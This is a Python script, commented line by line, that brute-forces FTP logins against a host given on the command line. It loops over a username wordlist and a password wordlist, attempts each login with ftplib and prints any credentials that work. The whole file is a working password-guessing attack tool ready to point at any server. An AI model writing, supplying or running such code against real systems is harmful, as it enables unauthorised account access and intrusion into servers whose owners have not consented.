# Import the ftplib module, which provides a class for implementing the FTP protocol.
import ftplib

# Import the sys module, which provides access to some variables used or maintained by the interpreter and to functions that interact strongly with the interpreter.
import sys

# Define a function called brute_force_ftp that takes three parameters: hostname, username_file, and password_file.
def brute_force_ftp(hostname, username_file, password_file):
    try:
        # Create an FTP object, which is a class that implements the FTP protocol.
        ftp = ftplib.FTP(hostname)
        
        # Open the username_file and password_file in read mode.
        with open(username_file, 'r') as users, open(password_file, 'r') as passwords:
            # Iterate over each line in the username_file.
            for user in users:
                # Remove leading and trailing whitespace from the username.
                user = user.strip()
                
                # Reset the password_file pointer to the beginning of the file.
                passwords.seek(0)
                
                # Iterate over each line in the password_file.
                for password in passwords:
                    # Remove leading and trailing whitespace from the password.
                    password = password.strip()
                    
                    try:
                        # Print a message indicating the current username and password being tried.
                        print(f"Trying {user}:{password}")
                        
                        # Attempt to log in to the FTP server using the current username and password.
                        ftp.login(user, password)
                        
                        # If the login is successful, print a success message and quit the FTP connection.
                        print(f"Success! Credentials are {user}:{password}")
                        ftp.quit()
                        
                        # Return True to indicate that the brute force was successful.
                        return True
                    except ftplib.error_perm:
                        #Catch the exception raised when the login credentials are invalid.
                        pass
        # Quit the FTP connection if no valid credentials were found.
        ftp.quit()
    except Exception as e:
        # Catch any other exceptions that may occur and print an error message.
        print(f"An error occurred: {e}")
    # Return False to indicate that the brute force was unsuccessful.
    return False

# Check if this script is being run directly (not being imported as a module).
if __name__ == "__main__":
    # Check if the correct number of command-line arguments were provided.
    if len(sys.argv) != 4:
        # Print an error message and exit if the correct number of arguments were not provided.
        print("Usage: python ftp_brute_force.py <hostname> <username_file> <password_file>")
        sys.exit(1)

    # Get the hostname, username_file, and password_file from the command-line arguments.
    hostname = sys.argv[1]
    username_file = sys.argv[2]
    password_file = sys.argv[3]

    # Call the brute_force_ftp function with the provided arguments.
    if brute_force_ftp(hostname, username_file, password_file):
        # Print a success message if the brute force was successful.
        print("Brute force successful.")
    else:
        # Print an unsuccessful message if the brute force was unsuccessful.
        print("Brute force unsuccessful.")
